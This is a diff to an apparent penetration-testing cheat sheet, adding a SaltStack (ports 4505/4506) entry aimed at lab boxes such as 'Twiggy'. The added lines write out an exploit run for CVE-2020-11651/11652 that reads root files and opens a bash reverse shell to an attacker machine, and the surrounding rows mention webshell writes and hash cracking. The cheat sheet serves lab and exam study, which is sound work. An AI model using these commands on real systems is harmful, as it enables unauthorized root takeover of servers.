@@ -139,6 +139,7 @@ When nmap comes back, don't panic at the list — recognise each port and reach 
 | 6379 | Redis | in-memory DB, **often no auth** | connect; write a webshell / SSH key | `[ENUM-REDIS]` |
 | 27017 | MongoDB | NoSQL DB, often no auth | dump collections → creds/tokens | `[ENUM-MONGODB]` |
 | 2375/2376 | Docker API | container engine | unauth API → **host root** | `[ENUM-DOCKER]` |
+| 4505/4506 | SaltStack (salt-master) | config-mgmt over ZeroMQ — runs as **root** | CVE-2020-11651 → unauth RCE = **instant root** | `[ENUM-SALTSTACK]` |
 
 **The instant "tells" — train these gut reactions:**
 - **Port 88 open → it's a Domain Controller → go AD** (BloodHound, roasting, spraying).
@@ -455,6 +456,19 @@ hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP h
 ```
 **Where it leads:** admin creds for the server's management controller (→ often the OS).
 
+## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack (salt-master)
+**What it is:** SaltStack is a config-management tool. Its **salt-master** talks to agents over **ZeroMQ** on **4505** (publish) + **4506** (request). Seeing **both** open — nmap labels them `zmtp` / `ZeroMQ ZMTP` — is the dead giveaway. A **salt-api** often runs too (commonly `:8000`, returns JSON). **The salt-master runs as ROOT**, so exploiting it = **instant root, no privesc.**
+```bash
+nmap -p4505,4506 -sV $IP                 # "ZeroMQ ZMTP 2.0" = SaltStack
+# CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → UNAUTH RCE as root
+# (vulnerable: Salt < 2019.2.4 / < 3000.2)
+git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
+pip3 install salt msgpack --break-system-packages        # the PoC needs the salt lib
+python3 exploit.py --master $IP --read /root/proof.txt   # read ANY file as root (returns content) — quickest flag
+python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'"   # root reverse shell
+```
+**Gotcha:** `--exec` is **blind** (it schedules the job, shows no output) → use **`--read`** for files, or `--exec` a **reverse shell** to see results. **Leads to:** root (first box: PG **Twiggy**).
+
 ## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
 When you meet an unknown port, work through these:
 1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
@@ -492,6 +506,7 @@ Use your Nmap results, then jump (Ctrl+F the tag):
 6379 Redis     → [ENUM-REDIS]
 27017 Mongo    → [ENUM-MONGODB]
 2375 Docker    → [ENUM-DOCKER]
+4505/4506 SaltStack → [ENUM-SALTSTACK]  (ZeroMQ = salt-master → unauth root)
 anything else  → [ENUM-UNUSUAL-PORTS]
 ```
 
